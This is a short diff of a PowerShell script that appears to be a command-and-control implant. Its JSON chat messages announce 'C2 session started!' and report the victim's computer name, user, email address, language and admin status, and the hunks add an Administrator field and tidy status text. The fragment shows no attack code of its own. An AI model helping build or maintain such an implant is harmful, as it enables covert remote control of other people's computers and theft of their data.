@@ -1064,6 +1064,7 @@ $script:jsonPayload = @{
 - **Current User**          : ``$env:USERNAME``
 - **Email Address**         : ``$email``
 - **Language**              : ``$systemLanguage``
+- **Administrator**         : ``$adminperms``
 
 :minidisc: **OS Information** :minidisc:
 -----------------------------------------------
@@ -1138,7 +1139,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 if ($InfoOnConnect -eq '1'){
-    $infocall = '``Getting system info - please wait..``'
+    $infocall = 'Getting system info - please wait..'
 }
 else{
     $infocall = 'Type `` Options `` in chat for commands list'
@@ -1151,7 +1152,6 @@ $script:jsonPayload = @{
         @{
             title       = "$env:COMPUTERNAME | C2 session started!"
             "description" = @"
-Admin Session    : ``$adminperm``
 Session Started  : ``$timestamp``
 
 $infocall
